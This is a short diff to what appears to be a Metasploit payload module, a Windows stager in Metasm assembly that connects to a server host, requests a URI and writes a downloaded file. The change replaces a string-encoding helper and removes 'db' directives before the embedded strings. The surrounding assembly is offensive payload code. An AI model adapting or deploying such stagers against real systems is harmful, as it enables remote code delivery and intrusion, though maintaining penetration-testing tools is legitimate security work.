@@ -124,9 +124,9 @@ module MetasploitModule
 
     # get protocol specific stuff
 
-    server_uri = Rex::Text.to_hex_cstring(server_uri)
-    filename = Rex::Text.to_hex_cstring(filename)
-    server_host = Rex::Text.to_hex_cstring(server_host)
+    server_uri = Metasm::Shellcode.define_cstring(server_uri)
+    filename = Metasm::Shellcode.define_cstring(filename)
+    server_host = Metasm::Shellcode.define_cstring(server_host)
 
     # create actual payload
     payload_data = %^
@@ -226,7 +226,7 @@ module MetasploitModule
       call httpopenrequest
 
     server_uri:
-      db #{server_uri}
+      #{server_uri}
 
     create_file:
       jmp.i8 get_filename
@@ -297,13 +297,13 @@ module MetasploitModule
 
     get_filename:
       call get_filename_return
-      db #{filename}
+      #{filename}
 
     get_server_host:
       call internetconnect
 
     server_host:
-      db #{server_host}
+      #{server_host}
     end:
 ^
     self.assembly = payload_data
